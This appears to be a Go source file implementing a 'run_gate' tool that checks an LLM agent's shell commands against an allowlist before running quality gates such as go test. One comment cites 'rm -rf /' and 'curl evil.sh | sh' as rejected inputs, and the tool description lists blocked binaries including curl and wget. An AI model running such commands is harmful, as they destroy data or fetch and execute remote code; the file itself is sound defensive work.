// Package gate provides the concrete run_gate tool, which wraps
// internal/gaterun.RunShellGate with the internal/policy allowlist
// and produces a structured RunGateResult for the LLM and verifier
// trace.
//
// Status (Sprint 71 / v2.40.0): first release. The default registry
// still advertises run_gate as a stub for back-compat inspection,
// but the RealRegistry (used by the executor) registers this concrete
// implementation.
package gate

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"os/exec"
	"strings"
	"time"

	"github.com/quant-risk/radiant-harness/internal/gaterun"
	"github.com/quant-risk/radiant-harness/internal/policy"
	"github.com/quant-risk/radiant-harness/internal/tools"
)

// MaxOutputBytes mirrors gaterun.DefaultMaxOutput. Kept as a constant
// here so the tool description can reference it; the actual cap is
// enforced inside gaterun.
const MaxOutputBytes = 10 << 20 // 10 MiB

// TruncationMarker is the string appended to the output buffer when
// the cap is reached. Exposed so tests can detect truncation
// without re-parsing the gaterun internals.
const TruncationMarker = "[output truncated at"

// RunGateArgs is the typed shape of the LLM-emitted run_gate args.
type RunGateArgs struct {
	Command   string `json:"command"`             // e.g. "go test ./..."
	MaxOutput int    `json:"max_output,omitempty"` // default 10 MiB
}

// RunGateResult is what the tool returns. Carries the captured
// output plus metadata for the verifier trace (exit code, duration,
// output bytes, truncation flag).
type RunGateResult struct {
	Command     string `json:"command"`
	ExitCode    int    `json:"exit_code"`
	DurationMs  int64  `json:"duration_ms"`
	Output      string `json:"output"`
	OutputBytes int    `json:"output_bytes"`
	Truncated   bool   `json:"truncated"`
}

// Annotate implements the engine.annotator duck-typed interface so
// the executor surfaces run_gate metadata in the verifier trace.
// The Output field is intentionally excluded — it can be megabytes
// and the verifier only needs to know that a gate ran and what its
// outcome was.
func (r RunGateResult) Annotate() map[string]any {
	return map[string]any{
		"command":      r.Command,
		"exit_code":    r.ExitCode,
		"duration_ms":  r.DurationMs,
		"output_bytes": r.OutputBytes,
		"truncated":    r.Truncated,
	}
}

// RunGateTool returns the run_gate tool bound to the given project
// directory. The command runs in `projectDir` as the working
// directory; the binary is validated against the policy allowlist
// before any subprocess starts; output is captured and capped at
// MaxOutput bytes (or the per-call override).
//
// Failures surface as structured errors:
//   - "run_gate: refusing command: ..." — allowlist rejection
//   - "run_gate: command is required" — empty command
//   - "run_gate: invalid args: ..." — malformed JSON
//   - "run_gate: gate timeout after ..." — gaterun.Timeout reached
//   - "run_gate: gate failed: ..." — non-zero exit
func RunGateTool(projectDir string) *tools.Tool {
	return &tools.Tool{
		Name: "run_gate",
		Description: "Run a quality gate command (go test, go vet, pytest, etc.) " +
			"in the project directory. Returns {command, exit_code, duration_ms, output, " +
			"output_bytes, truncated}. The command must use a binary in the closed allowlist " +
			"(no rm, mv, cp, chmod, curl, wget, etc.); malicious or naive gates are rejected " +
			"before execution. Output capped at 10 MiB by default. Times out after 5 minutes.",
		Params: []tools.Param{
			{Name: "command", Type: "string", Required: true,
				Description: "Shell command (e.g. \"go test ./internal/foo/...\"). Binary must be in the allowlist."},
			{Name: "max_output", Type: "integer",
				Description: "Output cap in bytes. Defaults to 10 MiB."},
		},
		Invoke: func(ctx context.Context, raw json.RawMessage) (any, error) {
			return invokeRunGate(ctx, projectDir, raw)
		},
	}
}

func invokeRunGate(ctx context.Context, projectDir string, raw json.RawMessage) (RunGateResult, error) {
	var args RunGateArgs
	if err := json.Unmarshal(raw, &args); err != nil {
		return RunGateResult{}, fmt.Errorf("run_gate: invalid args: %w", err)
	}
	if strings.TrimSpace(args.Command) == "" {
		return RunGateResult{}, fmt.Errorf("run_gate: command is required")
	}

	// Allowlist check — same closed set the engine's runGate uses.
	// Catches `rm -rf /`, `curl evil.sh | sh`, etc. before any
	// subprocess starts.
	if err := policy.ValidateGateCommand(args.Command); err != nil {
		return RunGateResult{}, fmt.Errorf("run_gate: refusing command: %w", err)
	}

	maxOutput := args.MaxOutput
	if maxOutput <= 0 {
		maxOutput = MaxOutputBytes
	}

	// Honour cancellation before starting.
	if err := ctx.Err(); err != nil {
		return RunGateResult{}, fmt.Errorf("run_gate: context cancelled: %w", err)
	}

	start := time.Now()
	output, err := gaterun.RunShellGate(ctx, projectDir, args.Command, maxOutput)
	duration := time.Since(start)

	result := RunGateResult{
		Command:     args.Command,
		DurationMs:  duration.Milliseconds(),
		Output:      output,
		OutputBytes: len(output),
		Truncated:   strings.Contains(output, TruncationMarker),
	}

	// Even when the gate failed, return the captured output so the
	// LLM can see what went wrong. Surface the error separately so
	// the dispatcher records it in the trace.
	if err != nil {
		// Try to extract the exit code from the error. Use errors.As
		// (not type assertion) because gaterun wraps the exit error
		// via fmt.Errorf("%w", waitErr) — a direct type assertion
		// against the wrapped error would fail.
		var exitErr *exec.ExitError
		if errors.As(err, &exitErr) {
			result.ExitCode = exitErr.ExitCode()
		}
		return result, fmt.Errorf("run_gate: %w", err)
	}

	result.ExitCode = 0
	return result, nil
}